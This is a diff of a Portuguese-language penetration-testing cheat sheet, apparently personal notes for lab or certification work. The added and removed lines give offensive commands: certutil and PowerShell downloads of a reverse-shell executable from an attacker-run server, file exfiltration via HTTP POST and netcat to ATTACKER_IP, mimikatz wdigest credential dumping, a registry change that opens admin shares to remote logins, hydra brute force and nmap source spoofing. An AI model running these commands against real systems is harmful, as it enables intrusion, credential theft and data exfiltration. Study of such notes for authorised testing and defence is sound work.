@@ -380,7 +380,7 @@ rpcclient -U <username>%<password> <hostname_or_ip>
 ```
 conectando ao servidor via Null Session
 ```
-rpcclient -U "" -N <hostname_or_ip>
+rpcclient -U "" -N <hostname_or_ip> -p <port>
 ```
 
 **Comando help**
@@ -872,6 +872,28 @@ exploit/windows/smb/ms17_010_psexec
 exploit/windows/smb/ms17_010_eternalblue
 ```
 
+## utilitário para download/upload de arquivo
+### CMUD
+transferencia do arquivo rev
+```
+certutil.exe -urlcache -split -f "http://<meu_ip>:PORT/rev.exe"
+```
+executar antes
+```
+python3 -m http.server <PORT>
+```
+
+
+### powershell
+```
+# Baixar arquivo
+Invoke-WebRequest -Uri "http://DEST_IP/arquivo.txt" -OutFile "C:\Temp\arquivo.txt"
+
+
+# Enviar arquivo via POST 
+Invoke-RestMethod -Uri "http://DEST_IP/upload" -Method Post -InFile "C:\Temp\arquivo.txt"
+```
+
 ## Cracking hashes (hashdump)
 john
 ```
@@ -928,6 +950,10 @@ O parâmetro `-w` ativa a busca por senhas em texto claro armazenadas no Digest 
 mimikatz para pegar credenciais
 ```
 wdigest
+
+
+privilege::debug
+sekurlsa::wdigest
 ```
 
 ## obtendo shell/ validando usuário
@@ -1095,6 +1121,26 @@ whoami /priv
 whoami /all
 ```
 
+## chave de registro
+```
+smbclient //172.16.1.145/C$ -U romio%romio -m SMB3 
+tree connect failed: NT_STATUS_ACCESS_DENIED
+```
+O erro `NT_STATUS_ACCESS_DENIED` indica que **o usuário `romio` não tem permissão para acessar o compartilhamento `C$`**, mesmo estando no grupo de administradores. Isso acontece porque:
+
+1. Os compartilhamentos administrativos (`C$`, `ADMIN$`) só permitem acesso remoto de contas de administrador que não estejam bloqueadas por políticas de segurança do Windows.
+    
+2. Algumas versões do Windows possuem a política **“LocalAccountTokenFilterPolicy”** ativada por padrão, que **filtra privilégios administrativos em conexões remotas**. Ou seja, mesmo `romio` sendo administrador local, o acesso remoto pode ser negado.
+
+desbloquear acesso remoto ao smb com conta admin:
+1. via powershell:
+```
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -PropertyType DWord -Force
+```
+2. via cmd:
+```
+```
+
 # Active Directory (AD)
 
 ## hashes na rede
@@ -1119,20 +1165,9 @@ xfreerdp /v:<IP_do_host> /u:<nome_do_usuário> /p:<senha>
 xfreerdp /v:10.10.39.3 /u:Administrator /p:letmein123!
 ```
 
-
-# powershell
-transferencia do arquivo rev via powershell
 ```
-Invoke-WebRequest -Uri http://<meu_ip>:PORT/rev.exe -OutFile "C:\PATH"
-
-iwr -uri http://<meu_ip>:PORT/rev.exe -outfile rev.exe
+nmap -p 3389 --script rdp-enum-encryption <target-ip>
 ```
-executar antes
-```
-python3 -m http.server <PORT>
-```
-
-
 
 # nc/netcat
 transferencia de arquivos via nc:
@@ -1141,16 +1176,6 @@ nc -lvp PORT > FILE  # receiver
 
 nc IP_ATTACKER PORT_OPPENED < FILE # sender
 ```
-# cmd
-transferencia do arquivo rev
-```
-certutil.exe -urlcache -split -f "http://<meu_ip>:PORT/rev.exe"
-```
-executar antes
-```
-python3 -m http.server <PORT>
-```
-
 
 ## login
 loggin bem sucedido
@@ -1211,6 +1236,14 @@ hydra -v -l <user> -p <pass> -M <targets> <protocol>
 hydra -v -L <user_list> -P <pass_list> <protocol>://<ip>:<port> 
 ```
 
+proxy `HYDRA_PROXY_HTTP` :
+```
+HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -v -l <user> -p <pass> -M <targets> <protocol> 
+
+HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://172.16.1.156:8080/manager/html
+
+```
+
 bruteforce em http
 ```
 hydra -v -L users.txt -P pass.txt URL http-post-form "/turismo/login.php:LOGIN_BUTTON_NAME=^USER^&PASS_BUTTON_NAME=^PASS^&SUBMIT_BUTTON_NAME:STRING_FILTER"
@@ -1236,6 +1269,7 @@ when you cancel a hydra bruteforce, the program save a `./hydra.restore` file, t
 ```
 hydra -R
 ```
+
 # cewl
 pesquisar por uma string em um site
 ```
@@ -1823,11 +1857,17 @@ ff02::2 ip6-allrouters
 ```
 
 ## nmap
+source port/spoof source IP
+```
+--source-port <port>
+
+# spoof source IP
+-S 1.2.3.4
+```
 
 **path to scripts**
 ```
 /usr/share/nmap/scripts
-
 ```
 
 **checking if the host are vulnerable to eternalblue (CVE-2017-0143)**
@@ -1892,7 +1932,7 @@ tar cf - minha_pasta | nc ATTACKER_IP 1234
 - o firewall pode bloquear reverse shell para portas acima de 1024, neste caso é bom tentarmos realizar reverse shell em portas de serviços web (80/443)
 
 ## microsoft iis
-No IIS, por algum motivo, quando eu criei o arquivo `sam_copy` ele não deixou isso visivel no servidor web, apenas quando eu coloquei a extensão .txt, ou seja, por algum motivo só ficou visivel com o nome de arquivo `sam_copy.txt`, eu tentei com extensão que não existia ex: `sam_copy.ablablue` mas n funcionou.
+No IIS, por algum motivo, quando eu criei o arquivo `sam_copy` ele não deixou isso visivel no servidor web, apenas quando eu coloquei a extensão .txt. Ou seja, por algum motivo só ficou visivel com o nome de arquivo `sam_copy.txt`, eu tentei com extensão que não existia ex: `sam_copy.ablablue` mas n funcionou.
 
 ### asp
 https://medium.com/@far00t01/asp-net-microsoft-iis-pentesting-04571fb071a4
@@ -2727,7 +2767,11 @@ ftp -v -n -s:ftp.txt
 servidor ftp com python
 - https://docs.python.org/3/library/ftplib.html
 
-
+subindo o servidor ftp no atacante
+```
+sudo systemctl status vsftpd
+sudo systemctl start vsftpd
+```
 ### exe2hex
 programa transforma binário em hexadecimal
 
@@ -2742,6 +2786,8 @@ programa transforma binário em hexadecimal
    para windows mais antigos, substituiriamos a flag `-p` (powershell) para `-b` batch (sistemas antigos)
     `-b` BAT      BAT output file (DEBUG.exe method - x86)
 	`-p` POSH     PoSh output file (PowerShell method - x86/x64)
+	`-x` EXE      The EXE binary file to convert
+
 
 3. copia o conteudo do plink.txt
    ```
@@ -2752,6 +2798,10 @@ programa transforma binário em hexadecimal
    ctrl+v
    ```
 
+no passo (4), se o alvo não possuir powershell
+```
+certutil -decodehex file.hex file.exe
+```
 
 ### falsificação de assinatura
 - Quando o servidor não possui utilitários para envio de arquivos, mas há possibilidade de fazermos upload de arquivos por uma aplicação web, podemos falsificar a assinatura do arquivo suportado, pdf por exemplo, e enviarmos o nosso payload.
@@ -2990,7 +3040,7 @@ shutdown /r /t 0
 
 
 
-## linux
+### linux
 enumeração de usuários e serviços
 ```
 cat /etc/passwd
@@ -3260,6 +3310,21 @@ hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/tomcat-bett
 
 ```
 - `-C FILE` --> colon separated "login:pass" format, instead of -L/-P options
+
+# CLI
+## Linux 
+tree
+exibe os subdiretórios no formato de arvore
+```
+tree PATH
+```
+
+## windows
+exibe os subdiretórios no formato de arvore
+```
+tree "PATH" /f /a
+tree "C:\Foxmail 7.2\Storage\suporteorionscorp@gmail.com(1)" /f /a
+```
 
 # relatório
 salvar os comandos do terminal e suas respectivas saidas
